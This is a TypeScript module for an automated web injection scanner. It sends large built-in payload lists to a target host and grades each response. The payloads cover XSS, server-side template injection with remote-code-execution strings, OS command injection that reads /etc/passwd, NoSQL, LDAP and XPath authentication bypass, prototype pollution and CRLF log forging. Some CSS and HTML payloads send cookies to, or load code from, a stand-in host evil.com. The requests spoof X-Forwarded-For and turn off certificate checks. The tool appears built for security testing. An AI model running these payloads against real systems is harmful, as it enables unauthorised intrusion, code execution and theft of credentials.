import * as http from "http";
import * as https from "https";
import { randomBytes } from "crypto";

export interface ScriptInjectionConfig {
  target: string;
  port: number;
  path: string;
  method: "GET" | "POST";
  paramName: string;
  technique: string;
  extraHeaders?: Record<string, string>;
}

export interface InjectionResult {
  technique: string;
  payload: string;
  status: "executed" | "reflected_unescaped" | "reflected_escaped" | "not_reflected" | "ssti_hit" | "cmdi_hit" | "error";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  severity: "critical" | "high" | "medium" | "info";
  timestamp: number;
}

export interface InjectionJob {
  id: string;
  config: ScriptInjectionConfig;
  startTime: number;
  active: boolean;
  results: InjectionResult[];
  summary: { executed: number; reflected: number; tested: number };
  trafficLog: string[];
}

const jobs = new Map<string, InjectionJob>();
function makeId() { return randomBytes(8).toString("hex"); }

const NONCE = randomBytes(4).toString("hex");

// ─── Advanced Payloads ────────────────────────────────────────────────────────
const PROTOTYPE_POLLUTION_PAYLOADS = [
  `__proto__[isAdmin]=true`,
  `__proto__[role]=admin`,
  `constructor[prototype][isAdmin]=true`,
  `__proto__[canDelete]=true`,
  `__proto__[admin]=true`,
  `{"__proto__":{"isAdmin":true}}`,
  `{"constructor":{"prototype":{"isAdmin":true}}}`,
  `%5B__proto__%5D%5BisAdmin%5D=true`,
  `__proto__[toString]=function(){alert(1)}`,
];

const CSTI_PAYLOADS = [
  // AngularJS 1.x
  `{{7*7}}`, `{{constructor.constructor('alert(1)')()}}`, `{{$on.constructor('alert(1)')()}}`,
  `{{a.constructor.fromCharCode(88)}}`, `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`,
  // Vue.js
  `{{_c.constructor('alert(1)')()}}`, `{{$options.template='<img src=x onerror=alert(1)>'}}`,
  // Handlebars
  `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`,
  // Twig/Jinja2
  `{{7*'7'}}`, `{{config}}`, `{{self}}`,
];

const CSS_INJECTION_PAYLOADS = [
  `background:url(//evil.com/steal?c=)`,
  `@import url(//evil.com/evil.css)`,
  `expression(alert(1))`, // IE
  `behavior:url(//evil.com/xss.htc)`,
  `-moz-binding:url(//evil.com/xss.xml#xss)`,
  `body{background-image:url("//evil.com/?"+document.cookie)}`,
  `*{color:expression(document.write('<script>alert(1)<\/script>'))}`,
];

const LOG_INJECTION_PAYLOADS = [
  `\r\nINFO: Admin logged in successfully`,
  `%0d%0aINFO: Password changed for admin`,
  `\n[ERROR] Authentication bypass successful`,
  `%0aGET /admin HTTP/1.1%0d%0aHost: internal`,
  `user%0d%0ainjected-header: injected`,
  `test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Hijacked</h1>`,
];

const LDAP_INJECTION_PAYLOADS = [
  `*)(|(password=*)`,
  `admin)(&`,
  `*)(uid=*))(|(uid=*`,
  `*)(|(objectclass=*)`,
  `admin)(|(password=*)`,
  `*()|&'`,
  `x%2F*%2F*%2F*%2F*%2F*%2F*%2F*%2F*`,
  `admin)(!(&(1=0)(password=))`,
];

const XPATH_INJECTION_PAYLOADS = [
  `' or '1'='1`,
  `' or 1=1 or ''='`,
  `x' or name()='username' or 'x'='y`,
  `' or count(parent::*[position()=1])=0 or 'a'='b`,
  `' or //user[name/text()='admin' and password/text()='test'] or '`,
  `admin' or '1'='1`,
  `' or position()=1 or ''='`,
];

const NOSQL_PAYLOADS = [
  // MongoDB injection
  `{"$gt":""}`,
  `{"$ne":null}`,
  `{"$where":"this.password.length>0"}`,
  `{"$regex":".*"}`,
  `{"$exists":true}`,
  // Array injection
  `[{"$gt":""}]`,
  // String based
  `'; return '' == ''`,
  `'; return 'a'=='a' && ''=='`,
  `a'; return true; var dummy='`,
];

const XSS_REFLECTED_PAYLOADS = [
  `<script>alert('XSS-${NONCE}')</script>`,
  `<img src=x onerror=alert('XSS-${NONCE}')>`,
  `<svg onload=alert('XSS-${NONCE}')>`,
  `<body onload=alert('XSS-${NONCE}')>`,
  `"><script>alert('XSS-${NONCE}')</script>`,
  `'><script>alert('XSS-${NONCE}')</script>`,
  `javascript:alert('XSS-${NONCE}')`,
  `<iframe src="javascript:alert('XSS-${NONCE}')">`,
  `<details open ontoggle=alert('XSS-${NONCE}')>`,
  `<input autofocus onfocus=alert('XSS-${NONCE}')>`,
  `<select onchange=alert('XSS-${NONCE}')><option>`,
  `<video><source onerror=alert('XSS-${NONCE}')>`,
  `<math><mtext></table></math><img src onerror=alert('XSS-${NONCE}')>`,
  `<script>fetch('http://xss.check/${NONCE}')</script>`,
  `<img src="x" onerror="eval(atob('YWxlcnQoJ1hTUy0ke05PTkNFfScpOw=='))">`,
  `%3Cscript%3Ealert('XSS-${NONCE}')%3C%2Fscript%3E`,
  `&lt;script&gt;alert('XSS-${NONCE}')&lt;/script&gt;`,
  `<ScRiPt>alert('XSS-${NONCE}')</ScRiPt>`,
  `<script/src="//xss.rocks/xss.js">`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">click</a>`,
  `{{7*7}}`,
  `${7*7}`,
  `<%= 7*7 %>`,
  `#{7*7}`,
  `*{7*7}`,
  `{7*7}`,
  `[[7*7]]`,
];

const XSS_HEADER_PAYLOADS = [
  { header: "X-Forwarded-For", value: `<script>alert('XSS-${NONCE}')</script>` },
  { header: "Referer", value: `javascript:alert('XSS-${NONCE}')` },
  { header: "User-Agent", value: `"><script>alert('XSS-${NONCE}')</script>` },
  { header: "X-Custom-Header", value: `<img src=x onerror=alert('XSS-${NONCE}')>` },
  { header: "Accept-Language", value: `en;q=1.0<script>alert('XSS-${NONCE}')</script>` },
];

const SSTI_PAYLOADS = [
  { payload: "{{7*7}}", expect: "49", engine: "Jinja2/Twig" },
  { payload: "${7*7}", expect: "49", engine: "FreeMarker/Groovy" },
  { payload: "<%= 7*7 %>", expect: "49", engine: "ERB/JSP" },
  { payload: "#{7*7}", expect: "49", engine: "Ruby" },
  { payload: "*{7*7}", expect: "49", engine: "Thymeleaf" },
  { payload: "{{7*'7'}}", expect: "7777777", engine: "Jinja2" },
  { payload: "{{config}}", expect: "config", engine: "Jinja2 config leak" },
  { payload: "{{self}}", expect: "self", engine: "Jinja2 object" },
  { payload: "a{{7*7}}b", expect: "a49b", engine: "Template engine" },
  { payload: "${\"freemarker.template.utility.Execute\"?new()('id')}", expect: "uid=", engine: "FreeMarker RCE" },
  { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", expect: "class", engine: "Jinja2 sandbox escape" },
  { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", expect: "uid=", engine: "Jinja2 RCE" },
  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", expect: "uid=", engine: "FreeMarker RCE" },
];

const CMDI_PAYLOADS = [
  { payload: "; id", expect: ["uid=", "gid="], desc: "Unix command injection via semicolon" },
  { payload: "| id", expect: ["uid=", "gid="], desc: "Pipe command injection" },
  { payload: "|| id", expect: ["uid=", "gid="], desc: "OR operator command injection" },
  { payload: "& id", expect: ["uid=", "gid="], desc: "Background command injection" },
  { payload: "&& id", expect: ["uid=", "gid="], desc: "AND operator command injection" },
  { payload: "`id`", expect: ["uid=", "gid="], desc: "Backtick command injection" },
  { payload: "$(id)", expect: ["uid=", "gid="], desc: "Subshell command injection" },
  { payload: "; cat /etc/passwd", expect: ["root:", "bin:", "nobody:"], desc: "File read via semicolon injection" },
  { payload: "| cat /etc/passwd", expect: ["root:", "bin:", "nobody:"], desc: "File read via pipe injection" },
  { payload: "; sleep 5", expect: [], desc: "Sleep-based blind command injection (timed)", timed: true },
  { payload: "& sleep 5", expect: [], desc: "Background sleep injection (timed)", timed: true },
  { payload: "127.0.0.1; ls -la", expect: ["."], desc: "Directory listing injection (ping-style)" },
  { payload: "127.0.0.1 && id", expect: ["uid="], desc: "AND command after IP injection" },
];

const HTML_INJECTION_PAYLOADS = [
  `<h1>Injected Heading</h1>`,
  `<b>Bold Injection</b>`,
  `<marquee>HTML Injection Test ${NONCE}</marquee>`,
  `<table><tr><td>Injected Table ${NONCE}</td></tr></table>`,
  `<a href="http://evil.com">Click me</a>`,
  `<form action="http://evil.com" method="POST"><input type="submit" value="Steal"></form>`,
  `<meta http-equiv="refresh" content="0;url=http://evil.com">`,
  `<link rel="stylesheet" href="http://evil.com/evil.css">`,
];

function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushTraffic(log: string[], lines: string[]) {
  log.push(...lines);
  if (log.length > 2000) log.splice(0, log.length - 2000);
}

function sendRequest(
  config: ScriptInjectionConfig,
  payload: string,
  extraHeaders: Record<string, string> = {},
  trafficLog: string[],
  cb: (code: number, body: string, rt: number, err?: string) => void
) {
  const isHttps = config.port === 443;
  const mod: typeof http | typeof https = isHttps ? https : http;
  const start = Date.now();
  let reqBody: string | null = null;
  let path = config.path;

  if (config.method === "GET") {
    const sep = config.path.includes("?") ? "&" : "?";
    path = `${config.path}${sep}${config.paramName}=${encodeURIComponent(payload)}`;
  } else {
    reqBody = `${config.paramName}=${encodeURIComponent(payload)}`;
  }

  const headers: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (compatible; AegisAI360/2.0; +https://aegisai360.com)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "X-Forwarded-For": `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    ...extraHeaders,
  };
  if (reqBody) {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    headers["Content-Length"] = String(reqBody.length);
  }

  const ts = tsFmt();
  const reqLines = [
    `[${ts}] ─────── NEW REQUEST ───────────────────────────────`,
    `[${ts}] → ${config.method} ${path} HTTP/1.1`,
    `[${ts}] → Host: ${config.target}:${config.port}`,
    ...Object.entries(headers).map(([k, v]) => `[${ts}] → ${k}: ${v}`),
    `[${ts}] →`,
  ];
  if (reqBody) reqLines.push(`[${ts}] → ${reqBody.slice(0, 400)}`);
  pushTraffic(trafficLog, reqLines);

  const req = mod.request({
    hostname: config.target, port: config.port, path,
    method: config.method, headers, timeout: 10000, rejectUnauthorized: false,
  }, (res) => {
    let data = "";
    res.on("data", (c: Buffer) => { data += c.toString().slice(0, 4096); });
    res.on("end", () => {
      const ts2 = tsFmt();
      const respLines = [
        `[${ts2}] ← HTTP/1.1 ${res.statusCode} ${res.statusMessage ?? ""}`,
        ...Object.entries(res.headers).map(([k, v]) => `[${ts2}] ← ${k}: ${Array.isArray(v) ? v.join(", ") : v}`),
        `[${ts2}] ←`,
        `[${ts2}] ← ${data.slice(0, 500).replace(/\r?\n/g, " ↵ ")}`,
        `[${ts2}] • RTT: ${Date.now() - start}ms`,
      ];
      pushTraffic(trafficLog, respLines);
      cb(res.statusCode ?? 0, data, Date.now() - start);
    });
  });
  req.on("timeout", () => {
    pushTraffic(trafficLog, [`[${tsFmt()}] ! TIMEOUT after 10000ms — server did not respond`]);
    req.destroy(); cb(0, "", 10000, "timeout");
  });
  req.on("error", (e) => {
    pushTraffic(trafficLog, [`[${tsFmt()}] ! ERROR: ${e.message}`]);
    cb(0, "", 0, e.message);
  });
  if (reqBody) req.write(reqBody);
  req.end();
}

function analyzeXSS(payload: string, body: string): { status: InjectionResult["status"]; evidence?: string; severity: InjectionResult["severity"] } {
  const lower = body.toLowerCase();
  const payloadLower = payload.toLowerCase();

  if (body.includes(payload)) {
    const hasExecutable = /<script/i.test(body) && body.includes(payload) ||
      /onerror=/i.test(body) && body.includes(payload) ||
      /onload=/i.test(body) && body.includes(payload) ||
      /javascript:/i.test(body) && body.includes(payload);
    return {
      status: hasExecutable ? "executed" : "reflected_unescaped",
      evidence: `Payload reflected verbatim in response: ${body.slice(Math.max(0, body.indexOf(payload) - 30), body.indexOf(payload) + payload.length + 30)}`,
      severity: hasExecutable ? "critical" : "high",
    };
  }

  const rawPayload = payload.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
  if (body.includes(rawPayload) || lower.includes(payloadLower.replace(/</g, "&lt;").replace(/>/g, "&gt;"))) {
    return { status: "reflected_escaped", evidence: "Payload reflected but HTML-encoded — encoding is present (may still be vulnerable in JS context)", severity: "medium" };
  }

  return { status: "not_reflected", severity: "info" };
}

export function startInjectionScan(config: ScriptInjectionConfig): InjectionJob {
  const id = makeId();
  const job: InjectionJob = {
    id, config, startTime: Date.now(),
    active: true, results: [], trafficLog: [],
    summary: { executed: 0, reflected: 0, tested: 0 },
  };
  jobs.set(id, job);

  const addResult = (r: InjectionResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "executed" || r.status === "ssti_hit" || r.status === "cmdi_hit") job.summary.executed++;
    if (r.status === "reflected_unescaped") job.summary.reflected++;
  };

  const delay = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

  const runAll = async () => {
    const techniques = config.technique === "all"
      ? ["xss-reflected", "xss-headers", "ssti", "cmdi", "html-injection", "prototype-pollution", "csti", "css-injection", "log-injection", "ldap-injection", "xpath-injection", "nosql-injection"]
      : [config.technique];

    if (techniques.includes("xss-reflected")) {
      for (const payload of XSS_REFLECTED_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "xss-reflected", payload, status: "error", responseTime: rt, evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const analysis = analyzeXSS(payload, body);
            addResult({ technique: "xss-reflected", payload, status: analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: analysis.severity, timestamp: Date.now() });
            resolve();
          });
        });
        await delay(80);
      }
    }

    if (techniques.includes("xss-headers") && job.active) {
      for (const { header, value } of XSS_HEADER_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          const extraHeaders: Record<string, string> = { [header]: value };
          sendRequest(config, "probe", extraHeaders, job.trafficLog, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "xss-headers", payload: `${header}: ${value}`, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const analysis = analyzeXSS(value, body);
            addResult({ technique: "xss-headers", payload: `${header}: ${value}`, status: analysis.status, statusCode: code, responseTime: rt, evidence: analysis.evidence, severity: analysis.severity, timestamp: Date.now() });
            resolve();
          });
        });
        await delay(80);
      }
    }

    if (techniques.includes("ssti") && job.active) {
      for (const { payload, expect, engine } of SSTI_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "ssti", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const hit = body.includes(expect);
            addResult({
              technique: "ssti", payload, status: hit ? "ssti_hit" : "not_reflected",
              statusCode: code, responseTime: rt,
              evidence: hit ? `SSTI CONFIRMED: Template engine (${engine}) evaluated payload — response contains '${expect}'. Full response snippet: ${body.slice(0, 300)}` : undefined,
              severity: hit ? "critical" : "info", timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(100);
      }
    }

    if (techniques.includes("cmdi") && job.active) {
      for (const { payload, expect, desc, timed } of CMDI_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          const before = Date.now();
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "cmdi", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            let hit = false;
            let evidence = "";
            if (timed) {
              hit = rt >= 4500;
              evidence = hit ? `Time-based command injection confirmed: response delayed ${rt}ms after SLEEP/sleep payload — ${desc}` : "";
            } else {
              const found = expect.find((e) => body.includes(e));
              hit = !!found;
              evidence = found ? `Command injection confirmed: response contains '${found}' — ${desc}. Response snippet: ${body.slice(0, 300)}` : "";
            }
            addResult({
              technique: "cmdi", payload, status: hit ? "cmdi_hit" : "not_reflected",
              statusCode: code, responseTime: rt, evidence: hit ? evidence : undefined,
              severity: hit ? "critical" : "info", timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(timed ? 6000 : 120);
      }
    }

    if (techniques.includes("html-injection") && job.active) {
      for (const payload of HTML_INJECTION_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
            if (err) {
              addResult({ technique: "html-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() });
              return resolve();
            }
            const reflected = body.includes(payload);
            const encoded = body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
            addResult({
              technique: "html-injection", payload,
              status: reflected ? "reflected_unescaped" : encoded ? "reflected_escaped" : "not_reflected",
              statusCode: code, responseTime: rt,
              evidence: reflected ? `Raw HTML injected verbatim into response — enables phishing/UI redressing attacks` : undefined,
              severity: reflected ? "high" : encoded ? "medium" : "info",
              timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(80);
      }
    }

    const advancedMap: Record<string, () => Promise<void>> = {
      "prototype-pollution": async () => {
        for (const payload of PROTOTYPE_POLLUTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "prototype-pollution", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const hit = body.includes("isAdmin") || body.includes("\"admin\":true") || body.toLowerCase().includes("privilege");
              addResult({ technique: "prototype-pollution", payload, status: hit ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `Prototype pollution hit — server merged attacker properties: ${body.slice(0, 200)}` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
      "csti": async () => {
        for (const payload of CSTI_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "csti", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const hit = body.includes("49") || body.includes("7777777") || body.includes("uid=");
              addResult({ technique: "csti", payload, status: hit ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: hit ? `CLIENT-SIDE TEMPLATE INJECTION — Template engine evaluated payload: ${body.slice(0, 300)}` : undefined, severity: hit ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
      "css-injection": async () => {
        for (const payload of CSS_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "css-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const reflected = body.includes(payload) || body.includes("expression(") || body.includes("@import");
              addResult({ technique: "css-injection", payload, status: reflected ? "reflected_unescaped" : "not_reflected", statusCode: code, responseTime: rt, evidence: reflected ? `CSS injection reflected — can exfiltrate data or execute via expression()` : undefined, severity: reflected ? "high" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
      "log-injection": async () => {
        for (const payload of LOG_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "log-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const reflected = body.includes("injected-header") || body.includes("logged in") || code === 400;
              addResult({ technique: "log-injection", payload, status: reflected ? "reflected_unescaped" : "not_reflected", statusCode: code, responseTime: rt, evidence: reflected ? `CRLF injection — log forging or response splitting possible` : undefined, severity: reflected ? "high" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
      "ldap-injection": async () => {
        for (const payload of LDAP_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "ldap-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const vuln = body.toLowerCase().includes("ldap") || body.toLowerCase().includes("directory") || code === 500;
              addResult({ technique: "ldap-injection", payload, status: vuln ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: vuln ? `LDAP injection indicator — server may pass input to LDAP query: ${body.slice(0, 200)}` : undefined, severity: vuln ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
      "xpath-injection": async () => {
        for (const payload of XPATH_INJECTION_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "xpath-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const vuln = body.toLowerCase().includes("xpath") || body.toLowerCase().includes("xml") || code === 500;
              addResult({ technique: "xpath-injection", payload, status: vuln ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: vuln ? `XPath injection indicator — XML/XPath tree extraction possible` : undefined, severity: vuln ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
      "nosql-injection": async () => {
        for (const payload of NOSQL_PAYLOADS) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendRequest(config, payload, {}, job.trafficLog, (code, body, rt, err) => {
              if (err) { addResult({ technique: "nosql-injection", payload, status: "error", evidence: err, severity: "info", timestamp: Date.now() }); return resolve(); }
              const authBypass = code >= 200 && code < 400 && (body.toLowerCase().includes("dashboard") || body.toLowerCase().includes("token") || body.toLowerCase().includes("welcome"));
              const vuln = authBypass || body.toLowerCase().includes("mongo") || body.toLowerCase().includes("objectid");
              addResult({ technique: "nosql-injection", payload, status: vuln ? "executed" : "not_reflected", statusCode: code, responseTime: rt, evidence: vuln ? `NoSQL injection — MongoDB operator may bypass auth or extract data: ${body.slice(0, 200)}` : undefined, severity: vuln ? "critical" : "info", timestamp: Date.now() });
              resolve();
            });
          });
          await delay(80);
        }
      },
    };

    for (const [tech, fn] of Object.entries(advancedMap)) {
      if (techniques.includes(tech) && job.active) await fn();
    }

    job.active = false;
    jobs.delete(id);
  };

  runAll();
  return job;
}

export function getInjectionJob(id: string): InjectionJob | undefined {
  return jobs.get(id);
}

export function stopInjectionScan(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
